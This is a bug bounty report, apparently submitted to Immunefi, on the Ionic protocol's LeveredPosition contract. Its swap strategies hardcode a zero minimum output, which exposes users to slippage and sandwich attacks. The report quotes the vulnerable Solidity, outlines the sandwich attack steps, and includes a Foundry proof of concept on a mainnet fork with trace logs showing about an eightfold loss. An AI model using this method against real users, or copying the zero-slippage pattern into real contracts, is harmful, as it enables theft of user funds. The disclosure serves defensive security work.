
# Users might loose token when funding the position using fundingAsset that is different than collateralAsset due to slippage or sandwich attack

Submitted on Sun Jun 16 2024 08:15:52 GMT-0400 (Atlantic Standard Time) by @perseverance for [IOP | Ionic](https://immunefi.com/bounty/ionic-iop/)

Report ID: #32252

Report type: Smart Contract

Target: https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPosition.sol

Impacts:
- Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

# Description

## Brief/Intro

The LeveredPosition contract allows users to fund the position contract with fundingAsset that is different than collateralAsset. 

https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPosition.sol#L56-L65
```solidity
function fundPosition(IERC20Upgradeable fundingAsset, uint256 amount) public {
    fundingAsset.safeTransferFrom(msg.sender, address(this), amount);
    _supplyCollateral(fundingAsset); 

    if (!pool.checkMembership(address(this), collateralMarket)) {
      address[] memory cTokens = new address[](1);
      cTokens[0] = address(collateralMarket);
      pool.enterMarkets(cTokens);
    }
  }
```

https://github.com/ionicprotocol/contracts/blob/development/contracts/ionic/levered/LeveredPosition.sol#L360-L365
```solidity
function _supplyCollateral(IERC20Upgradeable fundingAsset) internal returns (uint256 amountToSupply) {
    // in case the funding is with a different asset
    if (address(collateralAsset) != address(fundingAsset)) {
      // swap for collateral asset
      convertAllTo(fundingAsset, collateralAsset);
    }
 // ... 
} 
```

When the fundingAsset is different than collateralAsset, then the fundingAsset will be converted using redeem function of different exchange router. 


```solidity
function convertAllTo(IERC20Upgradeable inputToken, IERC20Upgradeable outputToken)
    private
    returns (uint256 outputAmount)
  {
    uint256 inputAmount = inputToken.balanceOf(address(this));
    (IRedemptionStrategy[] memory redemptionStrategies, bytes[] memory strategiesData) = factory
      .getRedemptionStrategies(inputToken, outputToken);

    if (redemptionStrategies.length == 0) revert ConvertFundsFailed();

    for (uint256 i = 0; i < redemptionStrategies.length; i++) {
      IRedemptionStrategy redemptionStrategy = redemptionStrategies[i];
      bytes memory strategyData = strategiesData[i];
      (outputToken, outputAmount) = convertCustomFunds(inputToken, inputAmount, redemptionStrategy, strategyData);
      inputAmount = outputAmount;
      inputToken = outputToken;
    }
  }

  function convertCustomFunds(
    IERC20Upgradeable inputToken,
    uint256 inputAmount,
    IRedemptionStrategy strategy,
    bytes memory strategyData
  ) private returns (IERC20Upgradeable, uint256) {
    bytes memory returndata = _functionDelegateCall(
      address(strategy),
      abi.encodeWithSelector(strategy.redeem.selector, inputToken, inputAmount, strategyData)
    );
    return abi.decode(returndata, (IERC20Upgradeable, uint256));
  }

```

So based on the input token (fundingAsset) and output token (collateralAsset) the factory.getRedemptionStrategies will return different strategy. 

For example, on Mode mainet, with the input token USDT and output token WETH, the strategy is: AlgebraSwapLiquidator 
Address: https://explorer.mode.network/address/0x5cA3fd2c285C4138185Ef1BdA7573D415020F3C8  


Function redeem of this contract: 
https://github.com/ionicprotocol/contracts/blob/development/contracts/liquidators/AlgebraSwapLiquidator.sol#L21-L42
```solidity
 function redeem(
    IERC20Upgradeable inputToken,
    uint256 inputAmount,
    bytes memory strategyData
  ) external returns (IERC20Upgradeable outputToken, uint256 outputAmount) {
    (address _outputToken, ISwapRouter swapRouter) = abi.decode(strategyData, (address, ISwapRouter));
    outputToken = IERC20Upgradeable(_outputToken);

    inputToken.approve(address(swapRouter), inputAmount);

    ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams(
      address(inputToken),
      _outputToken,
      address(this),
      block.timestamp,
      inputAmount,
      0, // amountOutMinimum
      0 // limitSqrtPrice
    );

    outputAmount = swapRouter.exactInputSingle(params);
  }
```

## Vulnerability Details
### The vulnerability 

With basic understanding, we can see that the vulnerability is in redeem function. You can notice in the swap parameters 

```solidity
 ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams(
      address(inputToken),
      _outputToken,
      address(this),
      block.timestamp,
      inputAmount,
      0, // amountOutMinimum
      0 // limitSqrtPrice
    );
```

So the amountOutMinimum is hardcoded to 0. So this has the risk of big slippage for users. 

So with this bug, there is unknown amount of ouput token that users will get after swap. In some market conditions, the slippage can be big for the users. For example, if the users perform swap when the price of input token vs output token for that specific contract is really high then the slippage can be big. 


I analysed also different SwapLiquidator in folder contracts\contracts\liquidators, and I observed that the outputOutMinimum is 0. So this bug is valid for different (maybe all) token pairs. 

For example: 
https://github.com/ionicprotocol/contracts/blob/development/contracts/liquidators/UniswapV2Liquidator.sol#L11-L18
```solidity
contract UniswapV2Liquidator is BaseUniswapV2Liquidator {
  function _swap(
    IUniswapV2Router02 uniswapV2Router,
    uint256 inputAmount,
    address[] memory swapPath
  ) internal override {
    uniswapV2Router.swapExactTokensForTokens(inputAmount, 0, swapPath, address(this), block.timestamp); // @audit-issue Minimum amount = 0 
  }
```


Now with the LeveredPosition is intended to deploy on Mode or Base Mainet that is based on Optimism. With layer 2 that don't have public Mempool, then it is difficult (or even not possible) to perform sandwich attack. 

In sandwich attack: 

Step 1: Front-run the transaction to perform swap that increases price of input token vs output token 

Step 2: The user's swap got executed 

Step 3: Back run the transaction to perform swap to restore the price as normal. Attacker get the benefit that is the tokens from user. ]
References: https://medium.com/immunefi/how-to-reproduce-a-simple-mev-attack-b38151616cb4 

But if the LeveredPosition is intended to deploy on Ethereum or mainet with public mempools, then this bug will allow attackers to perform sandwich attack. In sandwich attack, attackers will manipulate the price of the token pair and steal user's token and at the end, the users will receive much less tokens with big slippage. 

Even with Mode or Base mainets, But with some market conditions, the slippage can be big. For example, if some whale just swap a big amount of USDT to WETH, then the price of Weth can be really high in comparison to normal market conditions. When user submit the transaction, the price is normal. But unfortunately, some whale transaction just got executed before the user's transaction, then users will loose his money. 

So for fundingAsset that are different than collateralAsset, it is recommended to put into the function parameters some slippage parameter to make sure the minimum of output token amounts. If the slippage is bigger than intended, should revert the transaction.

# Impacts
# About the severity assessment

This bug cause users to loose tokens due to slippage that can be big in some market conditions. 
Or with deployed mainets that have public mempool, this bug allow the attackers to steal users' token during the transaction by performing sandwich attack. 

Severity: Critical 
Impact category: 
- Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
- User might loose money (tokens) in-motion 
        
## Proof of concept
#  Proof of concept


Step 1: User approve token for position to spend, e.g. USDT approve
Step 2: Call fundPosition() 

POC code: 

```solidity
function testFundPosition() public {

      address USDT = 0xf0F161fDA2712DB8b566946122a5af183995e2eD; 
      vm.label(USDT,"USDT"); 
      deal(USDT, address(this), 3000e6);
      IERC20Upgradeable(USDT).approve(address(position), 3000e6);
      position.fundPosition(IERC20Upgradeable(USDT), 3000e6);

    }
```

forge test --match-test testFundPosition --match-contract ModeWethUSDTLeveredPositionTest -vvvvvv | format > testFundPosition.t_240616_1400.log
In this case, with 3000 USDT, user got 832676378927207566 WETH = 0.83267638  

Log: 
```
  │   ├─ [2457] 0x4200000000000000000000000000000000000006::balanceOf(0xD8Abc2be7AD5D17940112969973357a3a3562998) [staticcall]
    │   │   │   │   │   └─ ← [Return] 11272340028380907085 [1.127e19]
    │   │   │   │   ├─ [2562] USDT::balanceOf(0xD8Abc2be7AD5D17940112969973357a3a3562998) [staticcall]
    │   │   │   │   │   └─ ← [Return] 57636305345 [5.763e10]
    │   │   │   │   ├─ [27701] 0x4200000000000000000000000000000000000006::transfer(LeveredPosition: [0xfF00b0380C38D5500aa7954c9f09f52B3c1d89DB], 832676378927207566 [8.326e17])
    │   │   │   │   │   ├─ emit Transfer(from: 0xD8Abc2be7AD5D17940112969973357a3a3562998, to: LeveredPosition: [0xfF00b0380C38D5500aa7954c9f09f52B3c1d89DB], value: 832676378927207566 [8.326e17])
    │   │   │   │   │   └─ ← [Return] true
```

I also created a test case to show the big slippage for example 10%. 
```solidity
function testFundPosition_Hacked() public {

      address USDT = 0xf0F161fDA2712DB8b566946122a5af183995e2eD; 
      address Weth = 0x4200000000000000000000000000000000000006; 
      vm.label(USDT,"USDT"); 
      deal(USDT, address(this), 3000e6);

      deal(USDT, USDTWhale, 100000e6); 
      address AlgrebraSwapRouter = 0xAc48FcF1049668B285f3dC72483DF5Ae2162f7e8; 

      vm.startPrank(USDTWhale);
      IERC20Upgradeable(USDT).approve(address(AlgrebraSwapRouter), 50000e6);
      ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams(
        address(USDT),
        Weth,
        address(this),
        block.timestamp,
        50000e6,
        0, // amountOutMinimum
        0 // limitSqrtPrice
      );
      ISwapRouter(AlgrebraSwapRouter).exactInputSingle(params);
      vm.stopPrank(); 


      IERC20Upgradeable(USDT).approve(address(position), 3000e6);
      position.fundPosition(IERC20Upgradeable(USDT), 3000e6);

    }


```
In this POC, I demonstrated a situation that the user executed the transaction unfortunately after a big whale transaction. So the user lost his money due to slippage. 

Log
```
─ [24901] 0x4200000000000000000000000000000000000006::transfer(LeveredPosition: [0xfF00b0380C38D5500aa7954c9f09f52B3c1d89DB], 103361123663643509 [1.033e17])
    │   │   │   │   │   ├─ emit Transfer(from: 0xD8Abc2be7AD5D17940112969973357a3a3562998, to: LeveredPosition: [0xfF00b0380C38D5500aa7954c9f09f52B3c1d89DB], value: 103361123663643509 [1.033e17])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [9484] 0xAc48FcF1049668B285f3dC72483DF5Ae2162f7e8::algebraSwapCallback(-103361123663643509 [-1.033e17], 3000000000 [3e9], 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000040000000000000000000000000ff00b0380c38d5500aa7954c9f09f52b3c1d89db0000000000000000000000000000000000000000000000000000000000000028f0f161fda2712db8b566946122a5af183995e2ed4200000000000000000000000000000000000006000000000000000000000000000000000000000000000000)
    │   │   │   │   │   ├─ [5733] USDT::transferFrom(LeveredPosition: [0xfF00b0380C38D5500aa7954c9f09f52B3c1d89DB], 0xD8Abc2be7AD5D17940112969973357a3a3562998, 3000000000 [3e9])
    │   │   │   │   │   │   ├─ emit Approval(owner: LeveredPosition: [0xfF00b0380C38D5500aa7954c9f09f52B3c1d89DB], spender: 0xAc48FcF1049668B285f3dC72483DF5Ae2162f7e8, value: 0)
    │   │   │   │   │   │   ├─ emit Transfer(from: LeveredPosition: [0xfF00b0380C38D5500aa7954c9f09f52B3c1d89DB], to: 0xD8Abc2be7AD5D17940112969973357a3a3562998, value: 3000000000 [3e9])
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   └─ ← [Stop] 
    │   │   │   │   ├─ [562] USDT::balanceOf(0xD8Abc2be7AD5D17940112969973357a3a3562998) [staticcall]
    │   │   │   │   │   └─ ← [Return] 110636305345 [1.106e11]
    │   │   │   │   ├─ emit Swap(param0: 0xAc48FcF1049668B285f3dC72483DF5Ae2162f7e8, param1: LeveredPosition: [0xfF00b0380C38D5500aa7954c9f09f52B3c1d89DB], param2: -103361123663643509 [-1.033e17], param3: 3000000000 [3e9], param4: 13987488239254594583059484 [1.398e25], param5: 235322792684601 [2.353e14], param6: -172848 [-1.728e5])
    │   │   │   │   └─ ← [Return] -103361123663643509 [-1.033e17], 3000000000 [3e9]
    │   │   │   └─ ← [Return] 103361123663643509 [1.033e17]
```

The user got 103361123663643509 = 0.10336112 WETH after the swap 

**So the amount got is 0.83267638/0.10336112 = 8 times less then normal condition**.

The full test case: 
```solidity
contract ModeWethUSDTLeveredPositionTest is LeveredPositionTest {
  address wethMarket = 0x71ef7EDa2Be775E5A7aa8afD02C45F059833e9d2;
  address USDTMarket = 0x94812F2eEa03A49869f95e1b5868C6f3206ee3D3;
  address wethWhale = 0x7380511493DD4c2f1dD75E9CCe5bD52C787D4B51;
  address USDTWhale = 0x082321F9939373b02Ad54ea214BF6e822531e679;

  
 function setUp() public forkAtBlock(MODE_MAINNET,9165568) { // Jun 16 2024 07:45:19 AM (+07:00 UTC)
    vm.label(wethMarket,"wethMarket"); 
    vm.label(USDTMarket,"USDTMarket"); 
    vm.label(wethWhale,"wethWhale");
    vm.label(USDTWhale,"USDTWhale"); 
  }


  function afterForkSetUp() internal override {
    super.afterForkSetUp();

    uint256 depositAmount = 1e18;
  

    ICErc20[] memory cTokens = new ICErc20[](1);
    cTokens[0] = ICErc20(USDTMarket);

    uint256[] memory newBorrowCaps = new uint256[](1);
    newBorrowCaps[0] = 1e36;

    IonicComptroller comptroller = IonicComptroller(ICErc20(wethMarket).comptroller());

    vm.prank(comptroller.admin());
    comptroller._setMarketBorrowCaps(cTokens, newBorrowCaps);

    _configurePair(wethMarket, USDTMarket);
    _fundMarketAndSelf(ICErc20(wethMarket), wethWhale);
    _fundMarketAndSelf(ICErc20(USDTMarket), USDTWhale);

    (position, maxLevRatio, minLevRatio) = _openLeveredPosition(address(this), depositAmount);
  }

    function testFundPosition() public {

      address USDT = 0xf0F161fDA2712DB8b566946122a5af183995e2eD; 
      vm.label(USDT,"USDT"); 
      deal(USDT, address(this), 3000e6);
      IERC20Upgradeable(USDT).approve(address(position), 3000e6);
      position.fundPosition(IERC20Upgradeable(USDT), 3000e6);

    }

    function testFundPosition_Hacked() public {

      address USDT = 0xf0F161fDA2712DB8b566946122a5af183995e2eD; 
      address Weth = 0x4200000000000000000000000000000000000006; 
      vm.label(USDT,"USDT"); 
      deal(USDT, address(this), 3000e6);

      deal(USDT, USDTWhale, 100000e6); 
      address AlgrebraSwapRouter = 0xAc48FcF1049668B285f3dC72483DF5Ae2162f7e8; 

      vm.startPrank(USDTWhale);
      IERC20Upgradeable(USDT).approve(address(AlgrebraSwapRouter), 50000e6);
      ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams(
        address(USDT),
        Weth,
        address(this),
        block.timestamp,
        50000e6,
        0, // amountOutMinimum
        0 // limitSqrtPrice
      );
      ISwapRouter(AlgrebraSwapRouter).exactInputSingle(params);
      vm.stopPrank(); 


      IERC20Upgradeable(USDT).approve(address(position), 3000e6);
      position.fundPosition(IERC20Upgradeable(USDT), 3000e6);

    }
}
```

https://gist.github.com/Perseverancesuccess2021/428c74dfde2d3e5d2a4b636ff3bf42e0

Just replace the test case for the file: contracts\contracts\test\LeveredPositionTest.t.sol 

To run the test: 

```
forge test --match-test testFundPosition --match-contract ModeWethUSDTLeveredPositionTest -vvvvvv | format > testFundPosition.t_240616_1410.log
```

Full Log:
https://gist.github.com/Perseverancesuccess2021/428c74dfde2d3e5d2a4b636ff3bf42e0
